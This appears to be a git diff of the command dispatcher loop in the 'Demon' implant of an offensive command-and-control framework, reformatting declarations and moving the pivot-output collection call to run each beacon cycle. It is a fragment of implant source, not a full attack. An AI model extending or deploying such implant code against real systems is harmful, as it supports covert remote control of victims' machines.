@@ -41,28 +41,27 @@ DEMON_COMMAND DemonCommands[] = {
 
 VOID CommandDispatcher( VOID )
 {
-    PPACKAGE    Package         = { 0 };
-
-    PARSER      Parser          = { 0 };
-    LPVOID      DataBuffer      = NULL;
-    UINT32      DataBufferSize  = 0;
-
-    PARSER      TaskParser      = { 0 };
-    LPVOID      TaskBuffer      = NULL;
-    UINT32      TaskBufferSize  = 0;
-
-    UINT32      CommandID       = 0;
-    UINT32      TaskID          = 0;
-    BOOL        AlreadyDec      = FALSE;
-    BOOL        FoundCommand    = FALSE;
+    PPACKAGE Package        = { 0 };
+    PARSER   Parser         = { 0 };
+    LPVOID   DataBuffer     = NULL;
+    UINT32   DataBufferSize = 0;
+    PARSER   TaskParser     = { 0 };
+    LPVOID   TaskBuffer     = NULL;
+    UINT32   TaskBufferSize = 0;
+    UINT32   CommandID      = 0;
+    UINT32   TaskID         = 0;
+    BOOL     AlreadyDec     = FALSE;
+    BOOL     FoundCommand   = FALSE;
 
     PRINTF( "Session ID => %x\n", Instance->Session.DemonID );
-    PUTS( "Start Routine" )
 
     do
     {
         if ( ! Instance->Session.Connected )
             return;
+
+        // Check if we have something in our Pivots connection and sends back the output from the pipes
+        PivotCollectOutput();
 
         DxSleep( Instance->Config.Sleeping * 1000 );
 
@@ -117,9 +116,6 @@ VOID CommandDispatcher( VOID )
             DataBuffer = NULL;
 
             ParserDestroy( &Parser );
-
-            // Check if we have something in our Pivots connection and sends back the output from the pipes
-            PivotCollectOutput();
         }
         else
         {
@@ -128,6 +124,9 @@ VOID CommandDispatcher( VOID )
             break;
 #endif
         }
+
+        // Check if we have something in our Pivots connection and sends back the output from the pipes
+        PivotCollectOutput();
 
     } while ( TRUE );
 
